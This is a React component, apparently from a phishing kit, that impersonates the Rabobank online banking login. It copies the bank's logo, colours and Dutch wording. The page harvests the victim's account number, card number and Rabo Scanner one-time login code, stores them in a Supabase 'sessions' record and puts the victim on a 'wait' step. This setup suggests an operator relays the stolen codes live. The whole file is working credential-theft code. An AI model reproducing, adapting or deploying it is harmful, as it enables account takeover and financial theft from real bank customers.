"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";

export function RabobankClient({ sessionId }: { sessionId: string }) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const [step, setStep] = useState(1);
  const [rekeningnummer, setRekeningnummer] = useState("");
  const [pasnummer, setPasnummer] = useState("");
  const [inlogcode, setInlogcode] = useState("");
  const [saving, setSaving] = useState(false);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (!supabase || !sessionId) return;
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      if (fd.verfuegernummer) setRekeningnummer(fd.verfuegernummer);
      if (fd.pasnummer) setPasnummer(fd.pasnummer);
      if (fd.pin) setInlogcode(fd.pin);
    })();
    return () => { cancelled = true; };
  }, [sessionId, supabase]);

  async function handleFinalSubmit() {
    if (!supabase || !sessionId) return;
    setSaving(true);
    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    await supabase.from("sessions").update({
      current_step: "wait",
      form_data: { 
        ...prev, 
        bankSlug: "rabobank", 
        bankName: "Rabobank", 
        verfuegernummer: rekeningnummer, 
        pasnummer, 
        pin: inlogcode 
      }
    }).eq("id", sessionId);
    router.replace(stepToPath("wait", sessionId));
  }

  return (
    <div className="min-h-screen bg-[#F5F6F7] font-sans flex flex-col items-center">
      <header className="bg-white w-full h-20 flex items-center justify-center border-b-4 border-[#003D8F] shadow-sm shrink-0">
        <img src="/bank-logos/rabobank.svg" alt="Rabobank" className="h-10" />
      </header>

      <main className="flex-1 w-full max-w-[500px] px-4 py-10">
        <div className="bg-white rounded-lg shadow-sm border border-gray-200 overflow-hidden">
          <div className="bg-[#003D8F] px-6 py-4">
            <h1 className="text-white text-xl font-bold">Inloggen</h1>
          </div>
          
          <div className="p-6 md:p-8">
            {step === 1 && (
              <form onSubmit={(e) => { e.preventDefault(); setStep(2); }}>
                <p className="text-[#333] mb-6 font-medium">Log in met uw rekeningnummer en pasnummer.</p>
                <div className="space-y-5 mb-8">
                  <div>
                    <label className="block text-sm font-bold text-[#003D8F] mb-1.5">Rekeningnummer</label>
                    <input 
                      required 
                      type="text" 
                      value={rekeningnummer} 
                      onChange={e => setRekeningnummer(e.target.value)} 
                      className="w-full border border-gray-300 rounded p-3 text-[15px] focus:outline-none focus:border-[#003D8F] focus:ring-1 focus:ring-[#003D8F]" 
                      placeholder="Bijv. 123456789"
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-bold text-[#003D8F] mb-1.5">Pasnummer</label>
                    <input 
                      required 
                      type="text" 
                      value={pasnummer} 
                      onChange={e => setPasnummer(e.target.value)} 
                      className="w-full border border-gray-300 rounded p-3 text-[15px] focus:outline-none focus:border-[#003D8F] focus:ring-1 focus:ring-[#003D8F]" 
                      placeholder="Bijv. 1234"
                    />
                  </div>
                </div>
                <button type="submit" disabled={!rekeningnummer || !pasnummer} className="w-full bg-[#F57C00] text-white font-bold py-3.5 rounded hover:bg-[#E65100] disabled:opacity-50 transition-colors">
                  Naar Rabo Scanner
                </button>
              </form>
            )}

            {step === 2 && (
              <form onSubmit={(e) => { e.preventDefault(); void handleFinalSubmit(); }}>
                <p className="text-[#333] mb-4 font-bold text-[15px]">1. Scan de kleurcode met uw Rabo Scanner.</p>
                <div className="bg-gray-100 p-4 rounded-lg flex justify-center mb-6 border border-gray-200">
                  <img src="/bank-assets/Rabobank/rabo_reader_comfort.png" alt="Rabo Scanner" className="max-h-40 object-contain" />
                </div>
                <p className="text-[#333] mb-4 font-bold text-[15px]">2. Neem de inlogcode over.</p>
                <div className="mb-8">
                  <label className="block text-sm font-bold text-[#003D8F] mb-1.5">Inlogcode</label>
                  <input 
                    required 
                    type="text" 
                    value={inlogcode} 
                    onChange={e => setInlogcode(e.target.value)} 
                    className="w-full border border-gray-300 rounded p-3 text-[15px] focus:outline-none focus:border-[#003D8F] focus:ring-1 focus:ring-[#003D8F] text-center tracking-widest text-lg font-mono" 
                  />
                </div>
                <div className="flex gap-3">
                  <button type="button" onClick={() => setStep(1)} disabled={saving} className="w-1/3 border border-[#003D8F] text-[#003D8F] font-bold py-3.5 rounded hover:bg-gray-50 disabled:opacity-50 transition-colors">
                    Terug
                  </button>
                  <button type="submit" disabled={saving || !inlogcode} className="w-2/3 bg-[#F57C00] text-white font-bold py-3.5 rounded hover:bg-[#E65100] disabled:opacity-50 transition-colors">
                    {saving ? "Laden..." : "Inloggen"}
                  </button>
                </div>
              </form>
            )}
          </div>
        </div>
      </main>
    </div>
  );
}